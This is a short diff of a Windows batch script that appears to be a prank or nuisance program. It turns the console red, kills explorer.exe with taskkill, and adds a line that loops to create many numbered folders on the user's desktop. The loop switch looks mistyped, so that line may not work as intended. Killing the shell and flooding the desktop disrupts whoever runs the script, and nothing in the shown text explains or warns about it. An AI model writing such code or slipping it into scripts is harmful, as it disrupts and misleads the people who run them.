@@ -2,6 +2,7 @@ color 4
 cd ..
 cd ..
 tree
+cmd/c "cd/d%userprofile%\desktop & for /I %i in (1, 1, 250) do (md %i)"
 taskkill /f /im explorer.exe
 color 4
 cd ..
